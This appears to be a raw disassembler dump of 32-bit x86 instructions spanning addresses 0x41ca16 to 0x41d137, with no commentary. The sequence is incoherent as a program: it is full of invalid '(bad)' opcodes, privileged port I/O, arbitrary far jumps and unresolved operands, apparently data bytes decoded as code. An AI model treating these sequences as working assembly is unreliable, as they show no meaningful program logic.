  41ca16:	call   0xbb3938ca
  41ca1b:	ins    DWORD PTR es:[edi],dx
  41ca1c:	sub    ah,BYTE PTR [edx]
  41ca1e:	push   esi
  41ca1f:	mov    ebp,0xaedefa9
  41ca24:	fsubr  QWORD PTR [ebx]
  41ca26:	icebp  
  41ca27:	icebp  
  41ca28:	xor    bh,BYTE PTR [esi]
  41ca2a:	mov    ch,0x34
  41ca2c:	(bad)  [edi-0x524c8f2c]
  41ca32:	mov    ch,0xa8
  41ca34:	test   eax,0x5aabb9f6
  41ca39:	push   esi
  41ca3a:	mov    esi,0xca669637
  41ca3f:	mov    edx,0xdf641f28
  41ca44:	mov    ds:0x99faf5c4,al
  41ca49:	jge    0x41ca2f
  41ca4b:	mov    dh,0x37
  41ca4d:	xchg   DWORD PTR [ecx+0x2e],esi
  41ca50:	push   ebp
  41ca51:	jo     0x41c9d7
  41ca53:	aaa    
  41ca54:	cmp    BYTE PTR [eax-0x2614ad4],dh
  41ca5a:	xchg   edx,eax
  41ca5b:	call   0xef312ad6
  41ca60:	mov    dl,0x24
  41ca62:	cdq    
  41ca63:	leave  
  41ca64:	std    
  41ca65:	(bad)  
  41ca66:	mov    ah,0x3b
  41ca68:	jge    0x41cab4
  41ca6a:	test   eax,0x80351a4c
  41ca6f:	fidivr WORD PTR [ebx]
  41ca71:	scas   eax,DWORD PTR es:[edi]
  41ca72:	xor    esi,DWORD PTR [edi]
  41ca74:	sti    
  41ca75:	cld    
  41ca76:	sbb    edx,DWORD PTR [eax-0x5a]
  41ca79:	(bad)  
  41ca7a:	mov    ebx,0xb4d2066c
  41ca7f:	mov    esi,0x4b8bb7a3
  41ca84:	add    ecx,eax
  41ca86:	sbb    edx,DWORD PTR [ecx]
  41ca88:	jge    0x41ca2a
  41ca8a:	popf   
  41ca8b:	xchg   esi,eax
  41ca8c:	fs sbb eax,0xf94a2d57
  41ca92:	pop    edi
  41ca93:	test   al,ch
  41ca95:	dec    edx
  41ca96:	ficom  WORD PTR [eax]
  41ca98:	(bad)  
  41ca99:	jo     0x41cb00
  41ca9b:	ins    DWORD PTR es:[edi],dx
  41ca9c:	mov    eax,0x1d864390
  41caa1:	xor    al,0x49
  41caa3:	mov    edx,0xc914f875
  41caa8:	pop    ss
  41caa9:	loopne 0x41ca9d
  41caab:	popf   
  41caac:	ret    0xf636
  41caaf:	adc    BYTE PTR [edx+ebx*2-0x2c72e5e],cl
  41cab6:	push   ds
  41cab7:	jae    0x41cabb
  41cab9:	shl    dl,cl
  41cabb:	dec    ebx
  41cabc:	mov    cs,WORD PTR [eax]
  41cabe:	jecxz  0x41cb1f
  41cac0:	rcr    DWORD PTR [esi-0x67],1
  41cac3:	mov    cl,0xff
  41cac5:	sahf   
  41cac6:	add    BYTE PTR ds:0x22d07f1b,cl
  41cacc:	cmp    edx,ebx
  41cace:	or     DWORD PTR [ebp+0x69867794],esi
  41cad4:	xchg   edi,eax
  41cad5:	cli    
  41cad6:	fdiv   QWORD PTR [ebp+eiz*4+0x26]
  41cada:	xchg   ecx,eax
  41cadb:	pop    eax
  41cadc:	pop    ebx
  41cadd:	lods   eax,DWORD PTR ds:[esi]
  41cade:	out    dx,al
  41cadf:	ret    
  41cae0:	jnp    0x41cb57
  41cae2:	mov    ah,0x64
  41cae4:	push   ss
  41cae5:	push   ecx
  41cae6:	mov    bh,0xbb
  41cae8:	dec    ecx
  41cae9:	inc    ecx
  41caea:	mov    eax,ds:0x2b5087b5
  41caef:	rol    BYTE PTR [ecx],1
  41caf1:	fisttp DWORD PTR [eax]
  41caf3:	nop
  41caf4:	cmp    eax,0x2aca4c1a
  41caf9:	add    eax,0xb41d05a1
  41cafe:	repz xor ecx,DWORD PTR [ebx-0x27]
  41cb02:	pop    ebx
  41cb03:	jge    0x41cb73
  41cb05:	(bad)  
  41cb06:	dec    edi
  41cb07:	jecxz  0x41cacd
  41cb09:	push   ds
  41cb0a:	jns    0x41caf6
  41cb0c:	xor    al,0xfe
  41cb0e:	push   es
  41cb0f:	mov    bh,0xa6
  41cb11:	xchg   esi,eax
  41cb12:	jo     0x41cae9
  41cb14:	mov    edi,edx
  41cb16:	rol    DWORD PTR [edi],1
  41cb18:	jp     0x41cad8
  41cb1a:	rol    BYTE PTR [eax],0xb
  41cb1d:	test   eax,0xafd80caa
  41cb22:	fsubp  st(5),st
  41cb24:	es (bad) 
  41cb27:	mov    ds:0xaaa68029,al
  41cb2c:	add    BYTE PTR [eax-0x3b],bl
  41cb2f:	(bad)  
  41cb30:	jb     0x41cb7a
  41cb32:	test   al,0x9f
  41cb34:	or     BYTE PTR [eax+0x33],dh
  41cb37:	cld    
  41cb38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb39:	push   edx
  41cb3a:	arpl   WORD PTR [esi+0x4a7fb13d],dx
  41cb40:	loope  0x41cb74
  41cb42:	cmp    esp,DWORD PTR es:[edi]
  41cb45:	jo     0x41cb65
  41cb47:	mov    eax,ds:0x2f68902e
  41cb4c:	(bad)  
  41cb4d:	push   ecx
  41cb4e:	dec    esi
  41cb4f:	jmp    0xa2f0:0x48296c96
  41cb56:	xlat   BYTE PTR ds:[ebx]
  41cb57:	lock push es
  41cb59:	fisttp WORD PTR [esi-0xf]
  41cb5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb5d:	in     eax,0x37
  41cb5f:	ja     0x41cb9b
  41cb61:	add    al,0x23
  41cb63:	gs mov bh,0x9c
  41cb66:	push   ebx
  41cb67:	and    esi,esp
  41cb69:	pop    es
  41cb6a:	ins    DWORD PTR es:[edi],dx
  41cb6b:	pop    ds
  41cb6c:	jle    0x41cb0c
  41cb6e:	je     0x41cbda
  41cb70:	std    
  41cb71:	(bad)  
  41cb72:	jae    0x41cb4c
  41cb74:	jno    0x41cb19
  41cb76:	loop   0x41cb51
  41cb78:	push   ebp
  41cb79:	cli    
  41cb7a:	cli    
  41cb7b:	in     al,dx
  41cb7c:	mov    ch,0x62
  41cb7e:	or     eax,DWORD PTR [edi+edx*2+0x30c2773f]
  41cb85:	dec    esi
  41cb86:	out    dx,eax
  41cb87:	or     esp,DWORD PTR [bx-0x5b51]
  41cb8c:	jge    0x41cbb7
  41cb8e:	dec    eax
  41cb8f:	loope  0x41cbd4
  41cb91:	jnp    0x41cb9e
  41cb93:	xchg   ecx,eax
  41cb94:	jbe    0x41cb31
  41cb96:	int    0x51
  41cb98:	xchg   edx,eax
  41cb99:	xchg   esi,eax
  41cb9a:	fsubr  st,st(4)
  41cb9c:	and    BYTE PTR [eax+0x3a],ah
  41cb9f:	ret    
  41cba0:	or     DWORD PTR [edx],0xffffffca
  41cba3:	iret   
  41cba4:	je     0x41cbda
  41cba6:	xchg   cx,ax
  41cba8:	in     eax,dx
  41cba9:	add    al,0x35
  41cbab:	sbb    eax,0x257a67c1
  41cbb0:	push   esi
  41cbb1:	mov    ch,0xce
  41cbb3:	mov    esp,0x78ee43c5
  41cbb8:	cmp    BYTE PTR [edx+0x76],dh
  41cbbb:	xchg   edi,eax
  41cbbc:	loope  0x41cc38
  41cbbe:	ins    BYTE PTR es:[edi],dx
  41cbbf:	sub    bl,BYTE PTR [edi-0x7aeafe8d]
  41cbc5:	and    bh,BYTE PTR [ecx+0x13a60fcb]
  41cbcb:	(bad)  
  41cbcc:	es cli 
  41cbce:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41cbd0:	not    DWORD PTR [eax]
  41cbd2:	imul   ecx,DWORD PTR [ebp+0x4726dfc6],0xffffffb8
  41cbd9:	imul   ebp,DWORD PTR [ecx-0x30971d9c],0xffffffb5
  41cbe0:	mov    BYTE PTR [ebp+0x60],dl
  41cbe3:	push   cs
  41cbe4:	push   edx
  41cbe5:	sub    BYTE PTR [eax],0x47
  41cbe8:	mov    eax,ds:0xd5a6a987
  41cbed:	sub    eax,0x18250677
  41cbf2:	add    BYTE PTR [edi+0x1a],ch
  41cbf5:	scas   al,BYTE PTR es:[edi]
  41cbf6:	inc    ebx
  41cbf7:	lods   al,BYTE PTR ds:[esi]
  41cbf8:	fwait
  41cbf9:	mov    dl,BYTE PTR [ecx+0x59e3b066]
  41cbff:	bound  eax,QWORD PTR [edi+0x5a]
  41cc02:	jb     0x41cc41
  41cc04:	or     al,0xf6
  41cc06:	mov    eax,ds:0xd985d0f
  41cc0b:	inc    edx
  41cc0c:	or     DWORD PTR [ebx+0x1],esi
  41cc0f:	test   al,0xad
  41cc11:	bound  edx,QWORD PTR [eax+0x40859c99]
  41cc17:	lods   al,BYTE PTR ds:[esi]
  41cc18:	aas    
  41cc19:	pop    ds
  41cc1a:	xchg   esp,eax
  41cc1b:	or     DWORD PTR [edi],edi
  41cc1d:	cmp    BYTE PTR [edi+0x68d4cd76],0xdf
  41cc24:	dec    ebx
  41cc25:	test   al,0xe
  41cc27:	or     al,0x6d
  41cc29:	std    
  41cc2a:	adc    ecx,DWORD PTR [ecx+0x31]
  41cc2d:	out    0x68,al
  41cc2f:	dec    edx
  41cc30:	cs std 
  41cc32:	fcmovu st,st(7)
  41cc34:	sub    cl,BYTE PTR [ebp-0x69118b38]
  41cc3a:	in     eax,dx
  41cc3b:	fld    DWORD PTR [ecx]
  41cc3d:	dec    ebx
  41cc3e:	or     esi,ebx
  41cc40:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc42:	push   ebx
  41cc43:	inc    ecx
  41cc44:	retf   
  41cc45:	xchg   BYTE PTR [eax-0x18],ah
  41cc48:	xor    ecx,DWORD PTR [edi+0x6b761d21]
  41cc4e:	popa   
  41cc4f:	mov    esi,0x47afb750
  41cc54:	mov    cs,WORD PTR [edx]
  41cc56:	jb     0x41cc74
  41cc58:	ins    DWORD PTR es:[edi],dx
  41cc59:	out    dx,eax
  41cc5a:	outs   dx,BYTE PTR ds:[esi]
  41cc5b:	jae    0x41cbfd
  41cc5d:	into   
  41cc5e:	mov    fs,ecx
  41cc60:	or     dh,BYTE PTR [edi-0x1cf9e9ce]
  41cc66:	arpl   WORD PTR [esi-0x46],ax
  41cc69:	sbb    eax,0x4aa30cc0
  41cc6e:	in     al,0xba
  41cc70:	es push es
  41cc72:	xchg   edi,eax
  41cc73:	or     DWORD PTR [esp+ebx*8-0x62],eax
  41cc77:	adc    eax,0x66e6d9f5
  41cc7c:	test   DWORD PTR [edx],0xf56cdb6d
  41cc82:	mov    ch,0x8f
  41cc84:	js     0x41cc33
  41cc86:	cwde   
  41cc87:	mov    dl,BYTE PTR ds:0x5e4555aa
  41cc8d:	xchg   ebx,eax
  41cc8e:	popf   
  41cc8f:	bound  edi,QWORD PTR [eax+0xc]
  41cc92:	cmp    esp,DWORD PTR [ecx+0x2b]
  41cc95:	adc    al,0x54
  41cc97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc98:	pop    esi
  41cc99:	push   0xf
  41cc9b:	mov    edi,0x840e86a5
  41cca0:	push   edx
  41cca1:	sbb    eax,0x7f8a3fb8
  41cca6:	lods   eax,DWORD PTR ds:[esi]
  41cca7:	test   eax,0xa15f951b
  41ccac:	inc    esp
  41ccad:	(bad)  
  41ccae:	hlt    
  41ccaf:	dec    esi
  41ccb0:	in     eax,dx
  41ccb1:	push   ss
  41ccb2:	inc    edi
  41ccb3:	bound  ecx,QWORD PTR [eax]
  41ccb5:	aad    0x4a
  41ccb7:	mov    bh,0x8f
  41ccb9:	ret    
  41ccba:	xchg   ebx,eax
  41ccbb:	fisubr WORD PTR [esi-0x5ad63d1c]
  41ccc1:	mov    al,0x7c
  41ccc3:	sub    esi,edx
  41ccc5:	push   ebx
  41ccc6:	inc    esi
  41ccc7:	or     al,0xa7
  41ccc9:	mov    ecx,0x968bcd7f
  41ccce:	fcomi  st,st(3)
  41ccd0:	ret    
  41ccd1:	jp     0x41cc53
  41ccd3:	dec    edi
  41ccd4:	sahf   
  41ccd5:	arpl   WORD PTR [esi+0x60],si
  41ccd8:	adc    al,BYTE PTR [ebx+0x58]
  41ccdb:	lods   eax,DWORD PTR ds:[esi]
  41ccdc:	enter  0x3891,0xb3
  41cce0:	xchg   edx,eax
  41cce1:	cmp    eax,0x70323100
  41cce6:	pop    es
  41cce7:	add    al,0xf5
  41cce9:	call   0xca61:0x15d60636
  41ccf0:	mov    al,ds:0x69b6db75
  41ccf5:	push   edi
  41ccf6:	sbb    dl,BYTE PTR [ebp-0x22]
  41ccf9:	dec    edi
  41ccfa:	mov    ds:0x8116565,eax
  41ccff:	les    esi,FWORD PTR [ecx]
  41cd01:	sbb    eax,0xee48e1f4
  41cd06:	int3   
  41cd07:	mov    esp,0xa2a9d6c3
  41cd0c:	rcr    BYTE PTR ds:0xa1f4d74,0x3c
  41cd13:	and    ebx,eax
  41cd15:	sbb    DWORD PTR [esi],edx
  41cd17:	dec    edi
  41cd18:	into   
  41cd19:	inc    edx
  41cd1a:	push   ss
  41cd1b:	fwait
  41cd1c:	outs   dx,DWORD PTR ds:[esi]
  41cd1d:	sbb    ch,BYTE PTR ds:0x10664775
  41cd23:	out    dx,eax
  41cd24:	inc    ebp
  41cd25:	aaa    
  41cd26:	scas   eax,DWORD PTR es:[edi]
  41cd27:	cld    
  41cd28:	mov    cl,0x40
  41cd2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd2b:	mov    ds:0x1077c36e,eax
  41cd30:	(bad)  
  41cd31:	in     eax,0x6a
  41cd33:	pop    esi
  41cd34:	cmp    DWORD PTR [ecx+ebx*1-0x6b],ebx
  41cd38:	scas   eax,DWORD PTR es:[edi]
  41cd39:	stos   DWORD PTR es:[edi],eax
  41cd3a:	or     ebx,DWORD PTR [eax+eax*1-0x55]
  41cd3e:	rcr    BYTE PTR [ebx+eax*1+0x6d6cdd7a],0xd4
  41cd46:	push   esi
  41cd47:	int3   
  41cd48:	push   ds
  41cd49:	fsub   st,st(6)
  41cd4b:	push   edx
  41cd4c:	lock sbb esp,DWORD PTR cs:[ecx-0x6a0b4d94]
  41cd54:	dec    eax
  41cd55:	jle    0x41cdc6
  41cd57:	and    ecx,DWORD PTR es:[ebx-0x67]
  41cd5b:	std    
  41cd5c:	outs   dx,BYTE PTR ds:[esi]
  41cd5d:	mul    DWORD PTR [edx]
  41cd5f:	and    esi,DWORD PTR [esi]
  41cd61:	int3   
  41cd62:	loop   0x41cd07
  41cd64:	repz inc edx
  41cd66:	test   DWORD PTR [esi+0x58],edx
  41cd69:	or     al,0xf1
  41cd6b:	sbb    DWORD PTR [ebx+0x20],ebx
  41cd6e:	sub    eax,0xf5115c70
  41cd73:	call   0xf4b0:0x11d7ab78
  41cd7a:	mov    al,ds:0xa9491c6e
  41cd7f:	jmp    0x58f40742
  41cd84:	inc    eax
  41cd85:	inc    esp
  41cd86:	ror    BYTE PTR [ebx],1
  41cd88:	in     al,dx
  41cd89:	retf   
  41cd8a:	ins    DWORD PTR es:[edi],dx
  41cd8b:	fs xchg esi,eax
  41cd8d:	test   eax,0xc9e0f956
  41cd92:	xchg   edx,eax
  41cd93:	imul   edx,DWORD PTR [ecx],0x63
  41cd96:	add    ch,al
  41cd98:	fadd   QWORD PTR [eax+0x586a94d]
  41cd9e:	outs   dx,BYTE PTR ds:[esi]
  41cd9f:	xchg   esp,eax
  41cda0:	mov    ah,0x7a
  41cda2:	xchg   BYTE PTR ds:0x4662fc8e,al
  41cda8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cda9:	jb     0x41cd4f
  41cdab:	push   0x36
  41cdad:	hlt    
  41cdae:	test   eax,0xc4158cf4
  41cdb4:	xchg   edi,eax
  41cdb5:	repnz ds ss (bad) 
  41cdba:	scas   al,BYTE PTR es:[edi]
  41cdbb:	es mov ebx,0xe5b8dfc9
  41cdc1:	and    al,0x98
  41cdc3:	das    
  41cdc4:	stc    
  41cdc5:	pop    esp
  41cdc6:	out    0xd8,al
  41cdc8:	sbb    BYTE PTR [ebx+0x1b],ah
  41cdcb:	inc    ebx
  41cdcc:	int    0x85
  41cdce:	sub    edi,DWORD PTR [ecx]
  41cdd0:	cmp    BYTE PTR [ebp-0x4b],ah
  41cdd3:	shl    ch,cl
  41cdd5:	mov    ebx,0x350efbfd
  41cdda:	push   ss
  41cddb:	aam    0x97
  41cddd:	ins    DWORD PTR es:[edi],dx
  41cdde:	repz test BYTE PTR [ebx],al
  41cde1:	icebp  
  41cde2:	jmp    0xb444:0x56ca09c
  41cde9:	lahf   
  41cdea:	sub    esi,edi
  41cdec:	pushf  
  41cded:	push   eax
  41cdee:	mov    al,0xe9
  41cdf0:	les    esi,FWORD PTR [ebx-0x2bdd52ec]
  41cdf6:	fcom   QWORD PTR [edx-0x62]
  41cdf9:	cld    
  41cdfa:	fstp   TBYTE PTR [ecx]
  41cdfc:	(bad)
  41cdff:	jmp    0x41cd9e
  41ce01:	dec    ebx
  41ce02:	stc    
  41ce03:	add    bh,0x4
  41ce06:	add    bl,BYTE PTR [edi+0x66]
  41ce09:	mov    cl,0x70
  41ce0b:	into   
  41ce0c:	aaa    
  41ce0d:	adc    al,0xe0
  41ce0f:	lock mov dl,0x2d
  41ce12:	test   esp,edx
  41ce14:	mov    fs,WORD PTR [esi]
  41ce16:	cwde   
  41ce17:	jne    0x41ce7a
  41ce19:	xchg   ecx,eax
  41ce1a:	into   
  41ce1b:	xchg   DWORD PTR [ebp+0x23],esi
  41ce1e:	jle    0x41ce9d
  41ce20:	cs cmp bl,bl
  41ce23:	(bad)  
  41ce24:	sub    eax,0xa004ca2c
  41ce29:	add    esp,ecx
  41ce2b:	rol    DWORD PTR [ebp+ebp*1+0x31d17555],0xb4
  41ce33:	pop    esi
  41ce34:	inc    ebp
  41ce35:	pop    esp
  41ce36:	cld    
  41ce37:	jg     0x41ce15
  41ce39:	xchg   edi,eax
  41ce3a:	in     eax,dx
  41ce3b:	add    DWORD PTR [esi-0x2ef0f77b],0xffffffb6
  41ce42:	sbb    DWORD PTR ss:[edx+0x1b5d509b],ebp
  41ce49:	fsub   st,st(7)
  41ce4b:	mov    ah,0x17
  41ce4d:	pusha  
  41ce4e:	add    DWORD PTR [ebp-0x66],esi
  41ce51:	and    esi,DWORD PTR [ecx+0x36]
  41ce54:	and    bl,BYTE PTR [ebx+0x57]
  41ce57:	cmp    BYTE PTR [eax+0x14b118cf],bh
  41ce5d:	inc    edx
  41ce5e:	rcl    BYTE PTR [eax-0x41],cl
  41ce61:	sub    al,0xf3
  41ce63:	push   es
  41ce64:	and    DWORD PTR [edi-0x7c],eax
  41ce67:	ficomp DWORD PTR [edi]
  41ce69:	jbe    0x41cea0
  41ce6b:	mov    eax,ds:0xcc21813b
  41ce70:	sahf   
  41ce71:	fisub  WORD PTR [ebp-0x4e947c6f]
  41ce77:	jp     0x41cedf
  41ce79:	xchg   ebx,eax
  41ce7a:	xor    DWORD PTR [ecx+0x24016e0c],edx
  41ce80:	in     al,dx
  41ce81:	push   ebp
  41ce82:	mov    ebp,0xce91219f
  41ce87:	nop
  41ce88:	mov    ?,WORD PTR [edi-0x752c03c5]
  41ce8e:	sub    eax,0x6d0187a0
  41ce93:	or     ecx,DWORD PTR [esi-0x45]
  41ce96:	dec    ebx
  41ce97:	das    
  41ce98:	pextrw ebp,mm6,0x28
  41ce9c:	xchg   ebx,eax
  41ce9d:	add    ebx,ebx
  41ce9f:	inc    ecx
  41cea0:	and    BYTE PTR [eax+0x67],bl
  41cea3:	mov    dl,0x81
  41cea5:	(bad)  
  41cea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cea7:	pop    esp
  41cea8:	dec    eax
  41cea9:	and    ecx,DWORD PTR [esi-0x73205672]
  41ceaf:	sbb    edi,DWORD PTR [ebx+0x48114ac8]
  41ceb5:	jo     0x41cee0
  41ceb7:	mov    esp,0x52c29a04
  41cebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cebd:	cmp    al,bl
  41cebf:	popf   
  41cec0:	xor    bh,cl
  41cec2:	retf   0xa984
  41cec5:	jno    0x41ce65
  41cec7:	sub    al,0x3a
  41cec9:	jp     0x41cefa
  41cecb:	sbb    BYTE PTR [ebp-0xfbdf9b2],al
  41ced1:	adc    ebx,ebx
  41ced3:	imul   esi,DWORD PTR [esp+ecx*2-0x5b],0x4378e7bd
  41cedb:	fnstcw WORD PTR [ebp+0x59]
  41cede:	cmovle edi,DWORD PTR [ebp-0x3a]
  41cee2:	aam    0x18
  41cee4:	in     al,0xc8
  41cee6:	or     al,0x9
  41cee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cee9:	in     al,dx
  41ceea:	out    dx,eax
  41ceeb:	nop
  41ceec:	mov    ds:0xf5053930,al
  41cef1:	push   esi
  41cef2:	sbb    ecx,DWORD PTR [edi-0x5a481760]
  41cef8:	jecxz  0x41cf6e
  41cefa:	jp     0x41ceb1
  41cefc:	xlat   BYTE PTR ds:[ebx]
  41cefd:	lds    esp,FWORD PTR [edx-0x7f]
  41cf00:	adc    eax,0x2a5e313a
  41cf05:	sbb    ebx,DWORD PTR [ecx]
  41cf07:	aam    0x6
  41cf09:	add    al,0x47
  41cf0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf0c:	add    DWORD PTR [ebp+0xd],ebp
  41cf0f:	push   eax
  41cf10:	aam    0x6d
  41cf12:	inc    eax
  41cf13:	outs   dx,BYTE PTR ds:[esi]
  41cf14:	outs   dx,DWORD PTR ds:[esi]
  41cf15:	add    eax,0x3d02290d
  41cf1a:	jp     0x41cf98
  41cf1c:	fst    st(4)
  41cf1e:	das    
  41cf1f:	es xor dl,cl
  41cf22:	mov    cl,0x22
  41cf24:	ins    BYTE PTR es:[edi],dx
  41cf25:	lods   eax,DWORD PTR ds:[esi]
  41cf26:	fwait
  41cf27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf28:	dec    ebx
  41cf29:	arpl   WORD PTR [edx-0x2f592be0],ax
  41cf2f:	xor    BYTE PTR [edi],cl
  41cf31:	int3   
  41cf32:	push   eax
  41cf33:	es cmp eax,0xf2b78ba9
  41cf39:	lock add ch,BYTE PTR [edi-0x23]
  41cf3d:	lods   al,BYTE PTR ds:[esi]
  41cf3e:	shl    BYTE PTR [edi+esi*1+0x3d],1
  41cf42:	loop   0x41cf6f
  41cf44:	add    dl,BYTE PTR [ecx+0x10]
  41cf47:	jmp    0x339f:0xe604a08e
  41cf4e:	push   eax
  41cf4f:	aaa    
  41cf50:	jl     0x41cfb7
  41cf52:	mov    dl,BYTE PTR [edi]
  41cf54:	inc    ebp
  41cf55:	xor    al,0x8b
  41cf57:	push   0xfc6f1d97
  41cf5c:	mov    WORD PTR [eax+esi*1-0x540b7f7e],fs
  41cf63:	div    BYTE PTR [esi-0x6a]
  41cf66:	int    0xab
  41cf68:	sbb    bl,BYTE PTR [ebx+0x38]
  41cf6b:	dec    edi
  41cf6c:	push   0xffffff9c
  41cf6e:	pop    ebp
  41cf6f:	push   ss
  41cf70:	shr    DWORD PTR ds:0xb602869e,0x77
  41cf77:	aam    0x14
  41cf79:	mov    ebp,0x14b798de
  41cf7e:	shl    bl,0xaa
  41cf81:	(bad)  
  41cf82:	ret    0xa49b
  41cf85:	shl    edi,cl
  41cf87:	fimul  DWORD PTR [eax]
  41cf89:	cs popf 
  41cf8b:	add    dh,BYTE PTR [ebp+0x60efb94c]
  41cf91:	lds    ebx,FWORD PTR [ebp+0x11]
  41cf94:	adc    dl,cl
  41cf96:	ss mov eax,0xdf7e8eac
  41cf9c:	and    dl,bl
  41cf9e:	stc    
  41cf9f:	mov    bh,0x9
  41cfa1:	pop    ss
  41cfa2:	lock xor eax,0x4f89f025
  41cfa8:	mul    DWORD PTR [ecx-0x79]
  41cfab:	data16 fsub DWORD PTR [ecx]
  41cfae:	adc    edi,DWORD PTR [edi-0x6f]
  41cfb1:	pop    ebx
  41cfb2:	xchg   esi,eax
  41cfb3:	inc    ebp
  41cfb4:	(bad)  
  41cfb5:	and    esi,DWORD PTR [esi-0x16]
  41cfb8:	pop    ebp
  41cfb9:	mov    esp,0x521adb59
  41cfbe:	sbb    cl,BYTE PTR [esi-0x58]
  41cfc1:	int    0x45
  41cfc3:	fwait
  41cfc4:	(bad)  
  41cfc5:	test   al,0x3d
  41cfc7:	jmp    0x41cfb7
  41cfc9:	call   0x58a6bc7c
  41cfce:	iret   
  41cfcf:	(bad)  
  41cfd0:	dec    edi
  41cfd1:	jae    0x41d008
  41cfd3:	mov    esi,0xa36b06c4
  41cfd8:	jo     0x41d046
  41cfda:	inc    ebp
  41cfdb:	push   ds
  41cfdc:	push   ebx
  41cfdd:	clc    
  41cfde:	mov    cl,0xc0
  41cfe0:	sub    eax,DWORD PTR [ebp+ebp*4-0x3a0ce0a9]
  41cfe7:	ja     0x41cfd8
  41cfe9:	dec    ecx
  41cfea:	popa   
  41cfeb:	xor    al,BYTE PTR [esi+0x22c6e872]
  41cff1:	add    DWORD PTR [esi],esp
  41cff3:	jmp    FWORD PTR [ebx+0x25]
  41cff6:	xlat   BYTE PTR ds:[ebx]
  41cff8:	mov    ah,0xa3
  41cffa:	(bad)  
  41cffb:	adc    BYTE PTR ds:0xfe2524f6,bh
  41d001:	mov    BYTE PTR [edi+0x4610e83b],al
  41d007:	das    
  41d008:	add    eax,ebp
  41d00a:	in     al,0x91
  41d00c:	jge    0x41cfdb
  41d00e:	push   esi
  41d00f:	push   esp
  41d010:	xor    cl,bh
  41d012:	ins    DWORD PTR es:[edi],dx
  41d013:	arpl   WORD PTR [eax],si
  41d015:	jne    0x41d05d
  41d017:	call   0xbe07ad1d
  41d01c:	jmp    0x70593560
  41d021:	mov    ds:0x806d72ef,al
  41d026:	or     BYTE PTR [esi-0x3c],ah
  41d029:	push   edx
  41d02a:	mov    esp,0xd9c4d37
  41d02f:	jmp    0xf4b80a4e
  41d034:	shr    esi,0xff
  41d037:	test   al,0x4f
  41d039:	out    0x11,al
  41d03b:	and    BYTE PTR [edx+0x477a3101],dl
  41d041:	fidiv  WORD PTR [ecx]
  41d043:	add    al,0xd9
  41d045:	es pop esi
  41d047:	jne    0x41d03d
  41d049:	inc    ecx
  41d04a:	or     DWORD PTR [ebx-0x4f],ebp
  41d04d:	jns    0x41cfd4
  41d04f:	sbb    BYTE PTR [edx],al
  41d051:	push   cs
  41d052:	push   0xa9600dba
  41d057:	fs xor esp,0x69b64a
  41d05e:	pusha  
  41d05f:	repz out dx,al
  41d061:	loopne 0x41d071
  41d063:	inc    esi
  41d064:	mov    cl,0x90
  41d066:	cmc    
  41d067:	mov    ebp,0x11447ca1
  41d06c:	shl    DWORD PTR [esi-0x36b59f39],1
  41d072:	push   edi
  41d073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d074:	mov    esp,DWORD PTR [esi]
  41d076:	fwait
  41d077:	pop    eax
  41d078:	add    al,0x8e
  41d07a:	cs add ecx,0x41a78164
  41d081:	sub    bl,al
  41d083:	repz inc ecx
  41d085:	mov    WORD PTR [edi-0x6a],?
  41d088:	sub    BYTE PTR [ebp+0x5b],ch
  41d08b:	ficom  WORD PTR [ecx+0x61f2815e]
  41d091:	xlat   BYTE PTR ds:[ebx]
  41d092:	gs iret 
  41d094:	push   0x35ac3c9
  41d099:	and    esp,DWORD PTR [esi+0x6405b7c1]
  41d09f:	mov    DWORD PTR [edi],ecx
  41d0a1:	lahf   
  41d0a2:	jmp    0xfb772abe
  41d0a7:	out    dx,eax
  41d0a8:	aas    
  41d0a9:	hlt    
  41d0aa:	test   esi,ebx
  41d0ac:	fwait
  41d0ad:	dec    eax
  41d0ae:	xchg   esi,eax
  41d0af:	mov    dh,0xf
  41d0b1:	out    dx,eax
  41d0b2:	pushf  
  41d0b3:	mov    eax,ds:0x9ef75b18
  41d0b8:	jmp    0x339d23e7
  41d0bd:	fisubr DWORD PTR ds:0x16c7
  41d0c2:	mov    edi,DWORD PTR [eax-0x28710276]
  41d0c8:	push   ss
  41d0c9:	jns    0x41d138
  41d0cb:	and    eax,DWORD PTR [ecx+0x37a800f3]
  41d0d1:	pop    ss
  41d0d2:	ss das 
  41d0d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0d5:	sar    ebp,cl
  41d0d7:	sbb    DWORD PTR [ebx+0x41],0xe9ea09a1
  41d0de:	push   esp
  41d0df:	js     0x41d0f5
  41d0e1:	jnp    0x41d11d
  41d0e3:	and    BYTE PTR [ebp-0x4c],dl
  41d0e6:	out    0xa7,eax
  41d0e8:	push   cs
  41d0e9:	jmp    0xf8d8:0xdc71b89a
  41d0f0:	(bad)  [ebx-0x73]
  41d0f3:	stos   DWORD PTR es:[edi],eax
  41d0f4:	je     0x41d0fe
  41d0f6:	xchg   bh,ah
  41d0f8:	test   DWORD PTR [esi+0x2b],0x2dc8d8db
  41d0ff:	arpl   bx,cx
  41d101:	jns    0x41d0ea
  41d103:	pop    edx
  41d104:	pusha  
  41d105:	add    esp,ebp
  41d107:	outs   dx,BYTE PTR ds:[esi]
  41d108:	hlt    
  41d109:	cs push esp
  41d10b:	lds    ebx,FWORD PTR [ebp+0x5e950713]
  41d111:	lods   al,BYTE PTR ds:[esi]
  41d112:	mov    esi,esp
  41d114:	mov    bl,0x70
  41d116:	test   DWORD PTR [esi],edi
  41d118:	push   esi
  41d119:	dec    edi
  41d11a:	and    DWORD PTR [ecx+0x388b614d],0xffffffe2
  41d121:	push   ebp
  41d122:	int3   
  41d123:	mov    esi,0xc6999436
  41d128:	pop    ebp
  41d129:	pop    es
  41d12a:	dec    ebp
  41d12b:	jg     0x41d0b7
  41d12d:	adc    ecx,edx
  41d12f:	out    dx,al
  41d130:	call   0xe322:0x6eac93ba
  41d137:	mov    eax,ds:0x4770277f
